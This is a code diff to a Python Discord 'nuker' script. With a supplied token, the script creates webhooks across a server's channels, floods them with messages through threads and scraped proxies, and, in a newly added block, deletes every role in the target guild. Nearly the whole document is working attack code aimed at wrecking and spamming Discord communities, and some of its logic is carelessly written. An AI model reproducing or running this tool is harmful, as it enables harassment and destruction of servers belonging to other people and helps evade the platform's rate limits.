@@ -23,6 +23,7 @@ with open('config.json', 'r') as f:
     CHANNEL_NAME = config["CHANNEL_NAME"]
     WEBHOOK_NAME = config["WEBHOOK_NAME"]
     WEBHOOK_PROFILE_PIC = config["WEBHOOK_PROFILE_PIC"]
+    DELETE_ROLES = config["Delete_Roles"]
     
 
 banner = Center.XCenter("""
@@ -44,14 +45,15 @@ banner = Center.XCenter("""
 print(Colorate.Vertical(Colors.red_to_purple, banner, 2))
 
 all_choices = f"""
-Token = {TOKEN}
-Message = {MESSAGE}
-Ammount of channels = {AMMOUNT_OF_CHANNELS}
-Spam PRN = {SPAM_PRN}
-Proxies = {PROXIES}
-Messages per channel = {MESSAGES_PER_CHANNEL}
+Token = {TOKEN} \n
 Channel name = {CHANNEL_NAME}
 Webhook name = {WEBHOOK_NAME}
+Message = {MESSAGE}
+Ammount of channels = {AMMOUNT_OF_CHANNELS}
+Messages per channel = {MESSAGES_PER_CHANNEL}
+Proxies = {PROXIES}
+Spam PRN = {SPAM_PRN}
+Delete_Roles = {DELETE_ROLES}
 """
 
 lines = all_choices.split("\n")
@@ -93,11 +95,10 @@ async def main():
     async with aiohttp.ClientSession() as schinken:
         async with schinken.get('https://discord.com/api/v9/users/@me', headers=nwords) as r:
             if r.status == 200:
-                Write.Print("Token is valid!", Colors.green, interval=0.0005)
-                print("")
+                print(Colorate.Color(Colors.blue, "Token is valid!", True))
                 print("Have Fun at Nuking")
             else:
-                Write.Print("Token is invalid!",Colors.red, interval=0.0005)
+                Write.Print("Token is invalid!",Colors.red, interval=0.00000001)
                 sys.exit()
         async with schinken.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r:
             channel_id = await r.json()
@@ -115,7 +116,7 @@ async def main():
                     webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                     threading.Thread(target=spamhook, args=(webhook,)).start()
             except:
-                Write.Print('U ratelimited af :skull:', Colors.red)
+                print('U ratelimited af :skull:', Colors.red)
 
 def spamhookp(hook):
     for i in range(MESSAGES_PER_CHANNEL):
@@ -133,7 +134,7 @@ def spamhookp(hook):
             try:
                 http.request('POST', hook, fields={'content': MESSAGE, 'avatar_url': WEBHOOK_PROFILE_PIC}, proxy_url=proxy())
             except:
-                Write.Print(f'error spamming! {hook}', Colors.red)
+                Write.Print(f'error spamming! {hook}', Colors.red, interval=0.00000001)
                 ############
     sys.exit()
 
@@ -152,38 +153,35 @@ def spamhook(hook):
                     'content': f"{MESSAGE} + {ran}", 
                     'avatar_url': f"{WEBHOOK_PROFILE_PIC}" })
             except:
-                Write.Print(f'error spamming! {hook}', Colors.red)
+                Write.Print(f'error spamming! {hook}', Colors.red, interval=0.00000001)
         else:
             try:
                 http.request('POST', hook, fields={'content': MESSAGE, 'avatar_url': WEBHOOK_PROFILE_PIC})
             except:
-                Write.Print(f'error spamming! {hook}', Colors.red)
+                Write.Print(f'error spamming! {hook}', Colors.red, interval=0.00000001)
 ####################################################################################
-                headers = nwords
-url = f"https://discord.com/api/guilds/{guild}/roles"
-response = requests.get(url, headers=nwords)
-if response.status_code == 200:
-    roles = response.json()
-    print(f"Successfully retrieved {len(roles)} roles")
-    
-    
-    for role in roles:
-        role_id = role["id"]
-        delete_url = f"https://discord.com/api/guilds/{guild}/roles/{role_id}"
-        
-        delete_response = requests.delete(delete_url, headers=nwords)
-        
-        if delete_response.status_code == 204:
-            Write.Print(f"Successfully deleted role {role['name']}\n", Colors.green)
-        else:
-            Write.Print(f"Failed to delete role {role['name']}.\n", Colors.red)
-else:
-    Write.Print(f"Failed to retrieve roles.", Colors.red)
-    sys.exit()
-
+headers = nwords
+if DELETE_ROLES == True:
+    async def DELETE_ROLESS():
+        async with aiohttp.ClientSession(headers=headers) as session:
+            async with session.get(f"https://discord.com/api/guilds/{guild}/roles") as response:
+                if response.status == 200:
+                    roles = await response.json()
+                    Write.Print(f"Successfully retrieved -{len(roles)}- roles\n", Colors.blue_to_green , interval=0.00000001)
+                    for role in roles:
+                        role_idd = role["id"]
+                        async with session.delete(f"https://discord.com/api/guilds/{guild}/roles/{role_idd}") as delete_response:
+                            if delete_response.status == 204:
+                                Write.Print(f"[+] Successfully deleted role {role['name']}", Colors.red, interval=0.00000001)
+                            else:
+                                print(Colorate.Color(Colors.red, f" [!] Failed to delete role {role['name']}.", True))
+                else:
+                     Write.Print(f" [!] Failed to retrieve roles.", Colors.red, interval=0.00000001)  
+                     await asyncio.gather(DELETE_ROLESS(), main())
+    asyncio.run(DELETE_ROLESS())                                  
 
 if PROXIES == True:
     proxy_scrape()
 
 if __name__ == '__main__':
-    asyncio.run(main())
+        asyncio.run(main())
